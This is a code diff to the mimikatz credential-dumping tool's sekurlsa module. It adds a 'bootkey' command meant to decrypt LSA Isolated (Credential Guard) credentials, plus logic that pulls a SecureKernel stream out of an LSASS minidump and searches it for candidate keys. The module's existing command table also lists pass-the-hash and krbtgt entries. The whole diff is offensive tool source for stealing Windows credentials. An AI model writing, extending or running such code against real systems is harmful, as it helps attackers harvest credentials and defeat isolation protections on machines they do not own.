@@ -18,6 +18,7 @@ const KUHL_M_C kuhl_m_c_sekurlsa[] = {
 
 	{kuhl_m_sekurlsa_process,			L"process",			L"Switch (or reinit) to LSASS process  context"},
 	{kuhl_m_sekurlsa_minidump,			L"minidump",		L"Switch (or reinit) to LSASS minidump context"},
+	{kuhl_m_sekurlsa_sk_bootKey,		L"bootkey",			L"Set the SecureKernel Boot Key to attempt to decrypt LSA Isolated credentials"},
 	{kuhl_m_sekurlsa_pth,				L"pth",				L"Pass-the-hash"},
 #if !defined(_M_ARM64)
 	{kuhl_m_sekurlsa_krbtgt,			L"krbtgt",			L"krbtgt!"},
@@ -155,10 +156,11 @@ NTSTATUS kuhl_m_sekurlsa_acquireLSA()
 	NTSTATUS status = STATUS_SUCCESS;
 	KULL_M_MEMORY_TYPE Type;
 	HANDLE hData = NULL;
-	DWORD pid;
+	DWORD pid, cbSk;
 	PMINIDUMP_SYSTEM_INFO pInfos;
 	DWORD processRights = PROCESS_VM_READ | ((MIMIKATZ_NT_MAJOR_VERSION < 6) ? PROCESS_QUERY_INFORMATION : PROCESS_QUERY_LIMITED_INFORMATION);
 	BOOL isError = FALSE;
+	PBYTE pSk;
 
 	if(!cLsass.hLsassMem)
 	{
@@ -200,6 +202,13 @@ NTSTATUS kuhl_m_sekurlsa_acquireLSA()
 					{
 						isError = TRUE;
 						PRINT_ERROR(L"Minidump without SystemInfoStream (?)\n");
+					}
+
+					if (pSk = (PBYTE)kull_m_minidump_stream(cLsass.hLsassMem->pHandleProcessDmp->hMinidump, (MINIDUMP_STREAM_TYPE)0x1337, &cbSk))
+					{
+						kprintf(L"  > SecureKernel stream found in minidump (%u bytes)\n", cbSk);
+						pid = kuhl_m_sekurlsa_sk_search(pSk, cbSk, TRUE);
+						kprintf(L"    %u candidate keys found\n", pid);
 					}
 				}
 				else
